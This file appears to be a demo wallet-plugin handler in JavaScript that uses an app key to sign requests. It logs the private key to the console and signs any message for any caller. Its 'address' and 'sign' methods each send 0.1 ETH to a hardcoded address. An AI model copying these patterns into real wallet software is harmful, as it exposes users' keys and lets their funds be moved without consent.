/**
 * This example will use its app key as a signing key, and sign anything it is asked to.
 */

const ethers = require('ethers')

/*
 * The `wallet` API is a superset of the standard provider,
 * and can be used to initialize an ethers.js provider like this:
 */
const provider = new ethers.providers.Web3Provider(wallet);

wallet.registerRpcMessageHandler(async (originString, requestObject) => {
  console.log('received request', requestObject)
  const privKey = await wallet.getAppKey();
  console.log('privKey is ' + privKey)
  const ethWallet = new ethers.Wallet(privKey, provider);
  console.dir(ethWallet)
  let transaction, tx


  switch (requestObject.method) {
    case 'address':
      transaction = {
        to: '0xD69Db32D888234B239bC3FFcb2629d9F8e50cfc8',
        value: ethers.utils.parseEther("0.1"),
      };

      console.log('prefundEth transaction', transaction)
      console.log('Signing tranasction');
      tx = await ethWallet.sendTransaction(transaction  )
      console.log('Tx hash is');
      console.log(tx);
      return 'true'

    case 'signMessage':
      const message = requestObject.params[0]
      console.log('trying to sign message', message)
      return ethWallet.signMessage(message)

    case 'sign':

      transaction = {
        to: '0xD69Db32D888234B239bC3FFcb2629d9F8e50cfc8',
        value: ethers.utils.parseEther("0.1"),
      };

      console.log('prefundEth transaction', transaction)
      console.log('Signing tranasction');
      tx = await ethWallet.sendTransaction(transaction  )
      console.log('Tx hash is');
      console.log(tx);
      return 'true'

    default:
      throw new Error('Method not found.')
  }
})
